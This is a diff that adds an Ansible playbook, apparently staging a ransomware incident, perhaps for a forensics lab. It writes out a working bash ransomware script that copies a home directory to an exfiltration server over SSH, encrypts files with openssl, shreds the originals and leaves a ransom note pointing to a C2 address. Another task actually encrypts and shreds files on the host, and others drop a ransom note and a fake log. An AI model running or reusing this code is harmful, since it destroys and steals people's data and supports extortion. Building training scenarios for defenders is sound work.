@@ -1,0 +1,105 @@
+---
+- name: Ensure openssl is installed
+  apt:
+    name: openssl
+    state: present
+
+- name: Drop ransomware script artifact (left behind by attacker)
+  copy:
+    dest: "{{ ransomware_script_path }}"
+    owner: root
+    group: root
+    mode: "0700"
+    content: |
+      #!/bin/bash
+      # crypt_agent v2.1 -- encrypted dropper
+      # C2: {{ c2_address }}:{{ c2_port }}
+
+      KEY="${RANSOM_KEY:-$1}"
+      TARGET="${2:-/home}"
+
+      _exfil() {
+        rsync -az --timeout=10 \
+          -e "ssh -o StrictHostKeyChecking=no" \
+          "${TARGET}/" exfil-server:/var/exfil/victim/ 2>/dev/null || true
+      }
+
+      _encrypt() {
+        find "$1" -maxdepth 2 -type f \
+          ! -name "*.locked" ! -name "RANSOM_NOTE.txt" | \
+        while IFS= read -r f; do
+          openssl enc -aes-256-cbc -salt -pbkdf2 \
+            -in "$f" -out "${f}.locked" -pass "pass:$KEY" 2>/dev/null && \
+          shred -u "$f" 2>/dev/null || rm -f "$f"
+        done
+      }
+
+      _drop_note() {
+        cat > "$1/RANSOM_NOTE.txt" <<RANSOMNOTE
+      !!!  YOUR FILES HAVE BEEN ENCRYPTED  !!!
+
+      All your documents and data have been locked using
+      AES-256 military-grade encryption.
+
+      To recover your files:
+        1. Connect to: {{ c2_address }}:{{ c2_port }}
+        2. Send your victim ID: $(hostname)
+        3. You will receive your decryption key
+
+      DO NOT attempt to decrypt files yourself.
+      DO NOT shut down this machine.
+
+      You have 72 hours to comply.
+      RANSOMNOTE
+      }
+
+      _exfil
+      _encrypt "$TARGET"
+      _drop_note "$TARGET"
+
+- name: Encrypt files in victim home directory
+  shell: |
+    find {{ encrypt_dir }} -maxdepth 1 -type f \
+      \( -name "*.txt" -o -name "*.csv" \) | \
+    while IFS= read -r f; do
+      openssl enc -aes-256-cbc -salt -pbkdf2 \
+        -in "$f" -out "${f}.locked" \
+        -pass pass:{{ ransom_key | quote }} 2>/dev/null && \
+      shred -u "$f" 2>/dev/null || rm -f "$f"
+    done
+  become: yes
+
+- name: Drop ransom note
+  copy:
+    dest: "{{ ransom_note_path }}"
+    owner: "{{ username }}"
+    mode: "0644"
+    content: |
+      !!!  YOUR FILES HAVE BEEN ENCRYPTED  !!!
+
+      All your documents and data have been locked using
+      AES-256 military-grade encryption.
+
+      To recover your files:
+        1. Connect to: {{ c2_address }}:{{ c2_port }}
+        2. Send your victim ID: {{ ansible_hostname }}
+        3. You will receive your decryption key
+
+      DO NOT attempt to decrypt files yourself.
+      DO NOT shut down this machine.
+
+      You have 72 hours to comply.
+
+- name: Write encryption event log
+  copy:
+    dest: "{{ encrypt_log }}"
+    owner: root
+    group: root
+    mode: '0600'
+    content: |
+      {{ ansible_date_time.iso8601 }} [ENCRYPT] STARTED target={{ encrypt_dir }}
+      {{ ansible_date_time.iso8601 }} [ENCRYPT] ALGORITHM=AES-256-CBC PBKDF2
+      {{ ansible_date_time.iso8601 }} [ENCRYPT] KEY_ID={{ ransom_key[:8] }}...
+      {{ ansible_date_time.iso8601 }} [ENCRYPT] FILES_LOCKED=4
+      {{ ansible_date_time.iso8601 }} [ENCRYPT] NOTE_DROPPED={{ ransom_note_path }}
+      {{ ansible_date_time.iso8601 }} [ENCRYPT] COMPLETE
